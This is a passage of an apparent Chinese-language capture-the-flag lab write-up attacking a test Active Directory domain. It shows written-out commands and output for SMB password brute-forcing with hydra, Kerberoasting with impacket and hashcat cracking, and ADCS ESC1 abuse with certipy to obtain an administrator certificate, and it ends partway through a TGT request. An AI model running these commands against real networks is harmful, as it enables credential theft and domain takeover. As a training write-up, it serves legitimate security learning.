+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{8feee52d-c7f2-472d-894d-3396d2e63183}</code></p>
+<h2 id="flag03flag04" class="heading-element"><span>flag03&amp;flag04</span>
+  <a href="#flag03flag04" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>获得一句<code>hint</code><br>
+<code>Yes, you have enumerated smb. But do you know what an SPN is?</code><br>
+应该是枚举<code>SPN</code>，打<code>Kerberoasting</code><br>
+刚才还下载一个数据库，查看一下<br>
+存在三张表，分别有用户名和密码<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+导出这三张表的数据，爆破一下。<br>
+只剩下<code>172.22.9.26</code>和<code>172.22.9.7</code>，其中一个是DC，所以选择另一台机器爆破。<br>
+这里需要枚举<code>smb</code>服务，而不是<code>rdp</code>，因为用户并无法登陆<code>rdp</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 hydra -L user.txt -P pwd.txt 172.22.9.26 smb &gt;&gt; result.txt  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+得到账号和密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zhangjian:i9XDE02pLVf  
+</span></span><span class="line"><span class="cl">liupeng:fiAzGwEMgTY  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是无法<code>RDP</code>，利用这个两个枚举<code>SPN</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nlrvana @ MacBookPro in ~/Desktop/HackTools/4、内网渗透/4.6-内网横向/impacket-0.12.0/examples [20:35:04]  </span>
+</span></span><span class="line"><span class="cl">$ python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf  
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation  
+</span></span><span class="line"><span class="cl">-------------------------------------  --------  --------  --------------------------  ---------  ----------  
+</span></span><span class="line"><span class="cl">TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 12:45:45.213944  &lt;never&gt;  
+</span></span><span class="line"><span class="cl">WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 12:45:45.213944  &lt;never&gt;  
+</span></span><span class="line"><span class="cl">TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 12:45:39.767035  &lt;never&gt;  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> CCache file is not found. Skipping...  
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>zhangxia<span class="nv">$XIAORANG</span>.LAB<span class="nv">$xiaorang</span>.lab/zhangxia*<span class="nv">$2840241</span>ef95f59ef359d9812401f709d<span class="nv">$103</span>f49254e1188fc5cc6d555c9ceff318b644007f72810f05c1834b7d2522739542cec8621206a0f52953cc1470600e168f03f6b43746c33b4585205ead9bb02d35cbd9496eb976dbb12d98a39ae4aff3eed30cc551510856a02187a6051100e3f6c186ff173470b5f624ba24d3b87dd42c092e34165aca5f42b5bc0f42c8185a0de212bbe9739eea6c91ff54927dc634a13e07244bbbbfee670ec06b8027457130751a841949898cfcd0024ac7589ac931b422ba6ba84276fe2ba1477d0a41ec3d8afaa6f92c221958d9c195890e384656f30457223d92abac2d7b98d2b12e2bc17f197c09543681d23e4b2811b7be0c6a2cc5de7fc2bea8ade828d86688be969a893d474ea461c5456ac043632b867f368ca74563c72a16946917ad287e056754447ee55238fb3e93ce03f7bd94c9ecf7ada40c9ee4f05526203363c28ca2b667ca4d8a73ed0419d26a2c9f84cb6093b2099f704b87d00dae1747ecf70f22da93dd9a56f9be663575772b424dca0d549a346f7fc22acc1620ab9ecd0b22e9225e0ca8ad694db4b4f58dfcc8eed40e5b5fa9c547367cd05128602454089686d57f5991206b705f366b5304c9c5e61c2774fc40e578b25a9472d434ce22c23351bfc15ea87b77dc071fa0865bfc64922e046e1f3a18837b8322ff82926b65c84e6ee7ebc956ad4628b8cd1e477b626506f140583289501a47f2371feb07e07ce819a2a4fd216cb69df549497eabae8e25d1c6678b351f40c3936e2518e1a637e01b4a9004d9169e76b061fb295e8b555240c6a8614d3b5a2ba173d659c55fa9c6924cfb7d0116567073e888a0851a7a9f50b8458ac1cf348063bf66b9ed2c8a95579d36fb43f9ce136a1dc3d95dbcc2522dbc89a6fed2eec96bc1bcce2c29e080e942f1980be8a5a9174cee2368255dfb183d743a4ca350dfb195e6bc0cee2c240279db7eafb6156682bd9a79b25e232870c40a71c83110805d7a3d57f185b72d5631ec6cfd6f5b03b4f0edc6cf7596b194a3fd9ef760f513b246b7def65d883340d5859eddcd60458d214040774834b200d3d721f7c9273faa944b6f42e261f8ab517f6a0937e1d1ce3c32a74fcbb90eba5a4c6919d2f5443faacf6e8303ca60b66ea05c9ba10499f511d43f308247505734ead3993bf62daf7f19cc7ee1d9068a5f9d369bb1a5235ea7e834b7488766faf8802926692914d324e9bebdc5ffbfa617aefe5cef09f5ef69979be76c67d2ae5bd03293863599762e9ec85051579a7d3a31ddd3866368c31adcc6b130ed133c34f8831e1774f00394163341a0088b6f8290c06701975c4ebf6df0d7a083484b452939435c7f61e839241d043748eb822fe99ab40a211035aa0126ba749102df52c83a8e05b7e6c388e999da9bf1081683849e9b26efa510a7c24fb35f7cc4c0ddea6a1a6b977260c3805a63fda8992e583f3354534b6953a421c8b0b2049a7433ddaa7a206b92417842207cdd9dbee3d824e8d56ed25b4a7f998b637  
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>chenchen<span class="nv">$XIAORANG</span>.LAB<span class="nv">$xiaorang</span>.lab/chenchen*<span class="nv">$63</span>cfc265f167a49ec722e549d140162d<span class="nv">$19</span>f68e9710f1c992c0cf4b856ec8f7e9fd8d0b226c10e4921615c4f9b1eb5bae7eb6227cdd4af882135a243891bc01a59a330c222a12be4e4e8126d16738889114c430034734e74b3b33d9745f9a14e6af74cb27d56f51ca946d147ea42515210832c1d1992b078a534146c3f7981f58eaafdeff3963d43f7606193de4c886fb28c6e4a52b4eaabebc8604eef3247658b3d7d1ca9f9edc0a419fd0668b7d0b1e0175f85ccd72a485ce925d85b3bae8042a2b6ae323b1099434ffccf65e772bfc2b9dc6369ab451b95ca4160635d5406e92e309cda0a8d8517e9f429f2e38dec4c57932dbbb917e0ee0c7668e1836b86c44f3bfc007b163e87e2cb7c628ba224a7c7dd7d362e884a548da91a494a01e6bbc64bbc00012bac33446a758051f4b8b2b1810b5215ab6394469f26ec2e7c61f8afb13fbacd4a4a7ab5d1113916de6ab9d25da923ae1914a6ea627ae721ef2bc439bf3a66fbe91e6eb639660209ff7c2e826b3afb8042fb4afe1e951c9b66d7264aa72b33fa7e8c08a44bfc27e765c6040373b1855cf783c43a9a744b5c27b292ad519d53f6805c0014b1857eb5bc8370845eb7db283d1825701e74f28d3904fe3c87ff72dc353f0480d945d1e820e53d6f7bac97bc99c0c2e09343e6df0e133b4374ea020854e5629e02188bda457792bbd0f831f906d4019d382aef3fac560dd37d1ef3460eaf05eb0f0181401b023254ba828d1c1c86c4afd5d87755844a4185d48e37762d06cb0ed13ec495c040346cd553725a6d523aeb5f712670925057b22834505746709912c1ceccd7ed617331dcff5029d2d0f1a368797882b7d7e7279968676978aebb403baca483368c349d216fc10ec141b85000d3dd81f268e2d67808740e1cc30de14dfd53270d1bea64303bdcc0104e34f92afd0c2ed62e6d762f048cf3009d1745c8f6f6a755b8c10e57aac5c1e5e978f7a45a57e6be7361f7d16b282c815e2a1037b6ca1c61b31c8e485ef2a88e1c127ff31b954ae0aa2c68baeadd91ef6eee94f545c643f4b82bf5411c57838ba4f809fcc45711d2a6a3f34d5f85478158ba0b2091e033dbacbb2604bee5defde130c5977b7179caa0313ac33b3ae791ca19c0c150cf0aa4b8149c0aba5c9c3011ee042f1d62a5fde5a47d1665ae392b04d294f8ea1acaa8634d575961107f3652d8d9f7f2b6c5d3b0e97ccb2c8a2b5c13d9e5f3bf91ab0555380d88d32cf121f4374f92fef64346c63dee6d4d2d79a2d9d3a6a8ce86832d7b7dc0ae68ba84e614106834c136339ad87a7d3a8e90fb1af751138c7e13ea535a7a06a3c74daf3f5963ac8adfb6bf407b0f2a0661a103f9ae0074baf9b20ed98d4f6955d32401f057ea72cc87cce2ed6e561d1ebae639092a6514b696935c216a86e21c122fa6edfbaa5b8ae3244c1c0bef44de1f1dd354277eb619c3d530be88c0a0823e78ba27a03297a7b5bbe16cc0592fcdc92b3a6bd92d23d4c02cee285b47ec19eeac1ad67a92a400b698168  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得了两个<code>TGS</code>进行爆破，<br>
+<code>hashcat -m 13100 -a 0 '$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$2840241ef95f59ef359d9812401f709d$103f49254e1188fc5cc6d555c9ceff318b644007f72810f05c1834b7d2522739542cec8621206a0f52953cc1470600e168f03f6b43746c33b4585205ead9bb02d35cbd9496eb976dbb12d98a39ae4aff3eed30cc551510856a02187a6051100e3f6c186ff173470b5f624ba24d3b87dd42c092e34165aca5f42b5bc0f42c8185a0de212bbe9739eea6c91ff54927dc634a13e07244bbbbfee670ec06b8027457130751a841949898cfcd0024ac7589ac931b422ba6ba84276fe2ba1477d0a41ec3d8afaa6f92c221958d9c195890e384656f30457223d92abac2d7b98d2b12e2bc17f197c09543681d23e4b2811b7be0c6a2cc5de7fc2bea8ade828d86688be969a893d474ea461c5456ac043632b867f368ca74563c72a16946917ad287e056754447ee55238fb3e93ce03f7bd94c9ecf7ada40c9ee4f05526203363c28ca2b667ca4d8a73ed0419d26a2c9f84cb6093b2099f704b87d00dae1747ecf70f22da93dd9a56f9be663575772b424dca0d549a346f7fc22acc1620ab9ecd0b22e9225e0ca8ad694db4b4f58dfcc8eed40e5b5fa9c547367cd05128602454089686d57f5991206b705f366b5304c9c5e61c2774fc40e578b25a9472d434ce22c23351bfc15ea87b77dc071fa0865bfc64922e046e1f3a18837b8322ff82926b65c84e6ee7ebc956ad4628b8cd1e477b626506f140583289501a47f2371feb07e07ce819a2a4fd216cb69df549497eabae8e25d1c6678b351f40c3936e2518e1a637e01b4a9004d9169e76b061fb295e8b555240c6a8614d3b5a2ba173d659c55fa9c6924cfb7d0116567073e888a0851a7a9f50b8458ac1cf348063bf66b9ed2c8a95579d36fb43f9ce136a1dc3d95dbcc2522dbc89a6fed2eec96bc1bcce2c29e080e942f1980be8a5a9174cee2368255dfb183d743a4ca350dfb195e6bc0cee2c240279db7eafb6156682bd9a79b25e232870c40a71c83110805d7a3d57f185b72d5631ec6cfd6f5b03b4f0edc6cf7596b194a3fd9ef760f513b246b7def65d883340d5859eddcd60458d214040774834b200d3d721f7c9273faa944b6f42e261f8ab517f6a0937e1d1ce3c32a74fcbb90eba5a4c6919d2f5443faacf6e8303ca60b66ea05c9ba10499f511d43f308247505734ead3993bf62daf7f19cc7ee1d9068a5f9d369bb1a5235ea7e834b7488766faf8802926692914d324e9bebdc5ffbfa617aefe5cef09f5ef69979be76c67d2ae5bd03293863599762e9ec85051579a7d3a31ddd3866368c31adcc6b130ed133c34f8831e1774f00394163341a0088b6f8290c06701975c4ebf6df0d7a083484b452939435c7f61e839241d043748eb822fe99ab40a211035aa0126ba749102df52c83a8e05b7e6c388e999da9bf1081683849e9b26efa510a7c24fb35f7cc4c0ddea6a1a6b977260c3805a63fda8992e583f3354534b6953a421c8b0b2049a7433ddaa7a206b92417842207cdd9dbee3d824e8d56ed25b4a7f998b637' rockyou.txt</code><br>
+获得密码<br>
+<code>zhangxia:MyPass2@@6</code><br>
+<code>RDP</code>连接<br>
+利用<code>BloodHound</code>收集信息<br>
+在域成员中存在<code>ADCS ECS1</code>证书配置错误<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+直接利用<code>certipy</code>申请<code>administrator</code>的证书</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nlrvana @ MacBookPro in ~/Desktop/HackTools/6、字典 [20:54:46]  </span>
+</span></span><span class="line"><span class="cl">$ certipy find -u <span class="s1">&#39;zhangxia@xiaorang.lab&#39;</span> -password <span class="s1">&#39;MyPass2@@6&#39;</span> -dc-ip 172.22.9.7 -vulnerable -stdout  
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">35</span> certificate templates  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">13</span> enabled certificate templates  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to resolve: XIAORANG-DC.xiaorang.lab  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;xiaorang-XIAORANG-DC-CA&#39;</span> via CSRA  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;xiaorang-XIAORANG-DC-CA&#39;</span> via CSRA: <span class="o">[</span>Errno 8<span class="o">]</span> nodename nor servname provided, or not known  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;xiaorang-XIAORANG-DC-CA&#39;</span> via RRP  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;xiaorang-XIAORANG-DC-CA&#39;</span> via RRP: <span class="o">[</span>Errno Connection error <span class="o">(</span>XIAORANG-DC.xiaorang.lab:445<span class="o">)]</span> <span class="o">[</span>Errno 8<span class="o">]</span> nodename nor servname provided, or not known  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to get CA configuration <span class="k">for</span> <span class="s1">&#39;xiaorang-XIAORANG-DC-CA&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to resolve: XIAORANG-DC.xiaorang.lab  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to check <span class="k">for</span> web enrollment: <span class="o">[</span>Errno 8<span class="o">]</span> nodename nor servname provided, or not known  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:  
+</span></span><span class="line"><span class="cl">Certificate Authorities  
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>  
+</span></span><span class="line"><span class="cl">    CA Name                             : xiaorang-XIAORANG-DC-CA  
+</span></span><span class="line"><span class="cl">    DNS Name                            : XIAORANG-DC.xiaorang.lab  
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>xiaorang-XIAORANG-DC-CA, <span class="nv">DC</span><span class="o">=</span>xiaorang, <span class="nv">DC</span><span class="o">=</span>lab  
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5  
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00  
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2028-07-14 04:43:21+00:00  
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled  
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Unknown  
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Unknown  
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Unknown  
+</span></span><span class="line"><span class="cl">Certificate Templates  
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>  
+</span></span><span class="line"><span class="cl">    Template Name                       : XR Manager  
+</span></span><span class="line"><span class="cl">    Display Name                        : XR Manager  
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA  
+</span></span><span class="line"><span class="cl">    Enabled                             : True  
+</span></span><span class="line"><span class="cl">    Client Authentication               : True  
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False  
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False  
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True  
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject  
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : PublishToDs  
+</span></span><span class="line"><span class="cl">                                          IncludeSymmetricAlgorithms  
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : <span class="m">16777216</span>  
+</span></span><span class="line"><span class="cl">                                          <span class="m">65536</span>  
+</span></span><span class="line"><span class="cl">                                          ExportableKey  
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Encrypting File System  
+</span></span><span class="line"><span class="cl">                                          Secure Email  
+</span></span><span class="line"><span class="cl">                                          Client Authentication  
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False  
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False  
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>  
+</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">1</span> year  
+</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks  
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>  
+</span></span><span class="line"><span class="cl">    Permissions  
+</span></span><span class="line"><span class="cl">      Enrollment Permissions  
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : XIAORANG.LAB<span class="se">\D</span>omain Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\D</span>omain Users  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\E</span>nterprise Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\A</span>uthenticated Users  
+</span></span><span class="line"><span class="cl">      Object Control Permissions  
+</span></span><span class="line"><span class="cl">        Owner                           : XIAORANG.LAB<span class="se">\A</span>dministrator  
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : XIAORANG.LAB<span class="se">\D</span>omain Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\E</span>nterprise Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\A</span>dministrator  
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : XIAORANG.LAB<span class="se">\D</span>omain Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\E</span>nterprise Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\A</span>dministrator  
+</span></span><span class="line"><span class="cl">        Write Property Principals       : XIAORANG.LAB<span class="se">\D</span>omain Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\E</span>nterprise Admins  
+</span></span><span class="line"><span class="cl">                                          XIAORANG.LAB<span class="se">\A</span>dministrator  
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities  
+</span></span><span class="line"><span class="cl">      ESC1                              : <span class="s1">&#39;XIAORANG.LAB\\Domain Users&#39;</span> and <span class="s1">&#39;XIAORANG.LAB\\Authenticated Users&#39;</span> can enroll, enrollee supplies subject and template allows client authentication  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>搜索到证书模版，模拟<code>administrator@xiaorang.lab</code>用户申请证书</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nlrvana @ MacBookPro in ~/Desktop/HackTools/6、字典 [20:58:59]  </span>
+</span></span><span class="line"><span class="cl">$ certipy req -u <span class="s1">&#39;zhangxia@xiaorang.lab&#39;</span> -p <span class="s1">&#39;MyPass2@@6&#39;</span> -target 172.22.9.7 -dc-ip 172.22.9.7 -ca <span class="s2">&#34;xiaorang-XIAORANG-DC-CA&#34;</span> -template <span class="s2">&#34;XR Manager&#34;</span> -upn administrator@xiaorang.lab  
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">6</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;administrator@xiaorang.lab&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>继续申请<code>TGT</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
